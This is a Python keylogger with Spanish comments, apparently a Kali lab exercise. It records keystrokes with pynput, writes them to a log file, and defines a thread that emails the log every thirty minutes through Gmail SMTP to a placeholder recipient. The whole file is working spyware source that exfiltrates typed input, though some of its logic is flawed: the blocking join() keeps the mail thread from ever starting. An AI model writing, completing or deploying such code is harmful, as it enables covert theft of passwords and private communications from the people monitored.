########################################################################################## Importo lo necesario para el keylogger

import os

import time

import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

import pynput
from pynput import keyboard


########################################################################################## Aquí hago la configuración del tema email y envío del log


# Configuración de correo para enviar el log a un sitio externo
EMAIL_ADDRESS = 'correodelkeylogger@gmail.com'
EMAIL_PASSWORD = 'ContraseñaCorreo'
DESTINATION_EMAIL = 'ejemplocorreodestinatario@gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587


########################################################################################## Aquí es donde indico donde quiero que se guarden las entradas del keylogger


log_file = os.environ.get(
    'keylogger_archivo',
    os.path.expanduser('/home/kali/Desktop/Keylogger/Keylogger.log')
)


########################################################################################## Aquí pongo una combinación de teclas por si quiero detener el keylogger


cancel_key = ord(
    os.environ.get(
        'keylogger_cancelar',
        'ª'
    )[0]
)

if os.environ.get('keylogger_cancelar', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        pass


########################################################################################## Creación de funciones para cuando cambiar de línea en el log (quiero que cambie de línea al hacer Enter o Click y que si has espacios, que escriba la línea entera)


buffer = []



def TeclaPulsada(event):
    global buffer
    
    # Comprueba si es un carácter que se pueda usar
    if hasattr(event, 'char') and event.char is not None:
        buffer.append(event.char)
    
    
    if event == keyboard.Key.space: # Comprueba si se pulsa el Espacio o el Enter
        buffer.append(' ')  # Añade un espacio

    elif event == keyboard.Key.enter:
        
        frase = ''.join(buffer) + '\n'  # Escribe la frase entera en el log
        buffer.clear()  # Reinicia el buffer

        try:
            with open(log_file, 'a') as f:
                f.write(frase)

        except Exception as e:
            print(f"Error al escribir en el log: {e}")




def on_click(x, y, button, pressed):

    if pressed:  # Si se hace click
        buffer.append('\n')  # Pasa a otra línea

        try:
            with open(log_file, 'a') as f:
                f.write(''.join(buffer))  # Escribe el contenido del buffer
            buffer.clear()  # Reinicia el buffer

        except Exception as e:
            print(f"Error al escribir en el log: {e}")




# Define el registrador después de la función
registrador = keyboard.Listener(on_press=TeclaPulsada)



########################################################################################## Aquí se inicia el registrador de teclas


# Inicia el registrador
try:
    registrador.start()
    registrador.join()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg = f'Error al registrar:\n {ex}'
    print(msg)
    with open(log_file, 'a') as f:
        f.write(f'\n{msg}')

    

########################################################################################## Aquí defino la función para enviar los mails en relación a lo que el keylogger recopile


def enviar_email():

    while True:

        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS     #Correo desde el que iniciará sesión para enviar el correo
            msg['To'] = DESTINATION_EMAIL   #Correo al que quiero que se envíe
            msg['Subject'] = 'Keylogger'    #Indico el asunto del correo

            with open(log_file, 'r') as f:  #Abre el log
                log_content = f.read()  #Lee lo que tiene dentro para copiarlo
            msg.attach(MIMEText(log_content, 'plain'))  #Adjunta el log al correo a enviar

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()   #Inicia el servicio para enviar el correo
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD) #Inicia sesión
                server.send_message(msg)    #Envía el correo

            print("Correo enviado correctamente")

        except Exception as e:  #Si surge algún problema o excepción al enviar el correo
            print(f"Error enviando el correo: {e}") #Muestra un mensaje de error

        time.sleep(1800)  # Envía cada media hora



# Inicia el hilo de envío de correos
email_thread = threading.Thread(target=enviar_email, daemon=True)
email_thread.start()



##########################################################################################
